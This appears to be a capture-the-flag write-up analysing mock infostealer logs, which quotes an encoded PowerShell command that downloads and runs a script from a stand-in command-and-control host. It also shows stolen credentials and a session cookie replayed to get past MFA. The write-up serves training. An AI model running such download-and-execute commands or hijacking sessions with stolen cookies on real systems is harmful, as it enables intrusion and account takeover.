## Challenge Prompt

Challenge #6 of the Flare CTF is now live and this one leaves a mess behind.

Stealer logs. Malware remnants. Files recovered from places they should not exist. Somewhere in the noise is a story of execution, intent, and consequence.

This challenge rewards careful analysis and patience. What happened is already over. What matters is whether you can log back in.

This week, 100 adventurers will claim the prize.

Guidelines for All Artifact Readers
- The quest appears first in the Flare Academy Discord, then on LinkedIn one hour later
- Recover the hidden flag to claim this week’s reward
- Flags double as discount codes at checkout. Format flare{...}
- One artifact per adventurer, to keep the realm in balance

## Problem Type
- Cookies


## Solve
Clicking the link gives us a `zip` archive of files. So, let's extract the files and examine the contents.

When we extract the archive we see that there is a folder called `FREE-LOGZ` inside:
<img width="661" height="110" alt="image" src="https://github.com/user-attachments/assets/0c04738f-6d6f-4c48-934a-2c910e6f8dd8" />

Within that folder we have several files and folders, we will start by examining the contents of each file:
<img width="713" height="354" alt="image" src="https://github.com/user-attachments/assets/edbede8d-8f4a-4982-a719-b3a0b6bcb5ca" />

In `Clipboard.txt` we have a Base64 encoded PowerShell command:
```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vY2MtbWFzdGVyLmZsci9wYXlsb2FkLnBzMScpOw==
```

If we Base64 decode that using [CyberChef](https://gchq.github.io/CyberChef), we get:
```powershell
iex (New-Object Net.WebClient).DownloadString('http://cc-master.flr/payload.ps1');
```
`.flr` isn't a valid domain so this is just a distraction.

Inside the `Chrome` folder things get interesting. There are 2 folders in here `Porfile 1` and `Profile 2`.<br>
I looked at each of these and there are lots of websites that end with `.flr` and `.ctf` which are not valid domains, but in the `Profile 2` folder the `Cookies.txt` file has something interesting.

[technotunez.com](technotunez.com) is a valid website, let's check it out!

We are presented with a login portal:<br>
<img width="486" height="600" alt="image" src="https://github.com/user-attachments/assets/7eef17ae-d799-48ee-b6f4-407f8541fd6d" />

In the `Passwords.txt` file, we have a username and password for this site to try:
```
URL: https://technotunez.com/
USER: j.parker
PASS: Droplet_Manager_99
```

Now we are brought to an MFA page:<br>
<img width="592" height="460" alt="image" src="https://github.com/user-attachments/assets/61ec708a-b0ec-4e82-bb10-4d822c0d7a1f" />

What if we try to use that cookie from the `Cookies.txt` file! We will press `F12` on the keyboard to jump into developer mode, then click on the `Storage` tab and then `Cookies`.
<img width="1905" height="460" alt="image" src="https://github.com/user-attachments/assets/bbe622ff-722a-4f89-8d05-639e95921c30" />

Now we will add our cookie. Cookies follow the Netscape HTTP Cookie Format:
1. Domain
2. Flag (True if domain begins with a dot - subdomain wildcard)
3. Path
4. Secure (True if connection must be HTTPS)
5. Expiration (Unix timestamp)
6. Name
7. Value

So we click the `+` in the top right to add our cookie.
```
.technotunez.com TRUE       /     TRUE    1766332822  session 0xjparks.ai5wYXJrczpsb2dnZWRpbg
Domain           Subdomain  Path  Secure  Expires     Name    Value
```

It shoud look like this in Chrome:
<img width="1913" height="231" alt="image" src="https://github.com/user-attachments/assets/497f8497-d519-4bd0-b32f-083fd01d1205" />

Reload the page and you are logged in and the flag is visible!
